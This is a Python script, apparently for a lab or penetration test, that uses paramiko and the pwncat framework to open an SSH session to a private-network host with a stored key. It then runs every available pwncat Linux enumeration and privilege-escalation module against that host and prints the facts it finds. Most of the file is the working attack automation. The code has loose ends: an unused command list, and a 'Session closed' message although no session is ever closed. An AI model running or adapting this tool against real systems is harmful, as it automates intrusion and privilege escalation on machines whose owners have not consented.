import paramiko
import pwncat
from pwncat.manager import Manager 
import time
import traceback
import sys

# === Configuration ===
target_host  = "10.0.0.148"
target_port  = 22
username     = "parallels"
ssh_key_path = f"/home/parallels/.ssh/id_ed25519"  # Replace with your actual private key path
manager      = Manager()

def connect_to_target( target_ip, username='sysadmin', target_port=22 ):
    """
    Connect to a target using an SSH direct connection.
    
    Args:
        target_ip (str): IP address of the target
        target_port (int): Port number of the bind shell (default: 22)
    """
    # Create a pwncat manager instance
    try:
        print(f"[*] Attempting to connect to {target_ip} as {username}")

        # Create the SSH session
        session = manager.create_session(
            platform = "linux",
            host     = target_ip,
            port     = target_port,
            user     = username,
            password = "",
            key      = ssh_key_path)  

        print(f"[+] Successfully connected to {target_ip}:{target_port}")
        print(f"[+] Session ID: {session.id}")
        
        # Get basic information about the target
        print(f"[*] Target hostname: {session.platform}")
        print(f"[*] Current user: {session.current_user()}")
        for d in session.platform.listdir(f'/home/{session.current_user().name}'):
            print( d )
        
        # You can now interact with the session
        # For example, run commands:
        result = session.platform.run("whoami", capture_output=True, text=True)
        print(f"[*] whoami output: {result.stdout.strip()}")

        return session           
    except Exception as e:
        print( traceback.format_exc() )
        print(f"[-] Connection failed: {str(e)}", file=sys.stderr)
        sys.exit(1)
        
        return None

manager.load_modules( )
manager.create_db_session( )
# === Step 5: Connect to the remote encrypted shell using pwncat ===
session = connect_to_target( target_host )

# Attempt privilege escalation
print("[*] Enumerating and attempting privilege escalation...\n")

# List available escalation modules
print("[*] Listing available escalation modules...\n")
modules = session.find_module( '*linux.*' )

MODULES_TO_SKIP =   [
                        'linux.enumerate.escalate.leak_privkey'
                    ]

for m in modules:
    if m.name not in MODULES_TO_SKIP:
        print( f"running {m.name}" )
        try:
            module_result = m.run( session=session )
        except:
            pass
        for r in module_result:
            try:
                print( r.title() )

                facts = session.facts
                for f in facts:
                    print( f.title() )  
            except:
                pass
        print( "finished" )


commands =  [ 
                'ls',
                'uname -a',
                'lsmod'
            ]

print("[*] Session closed.")
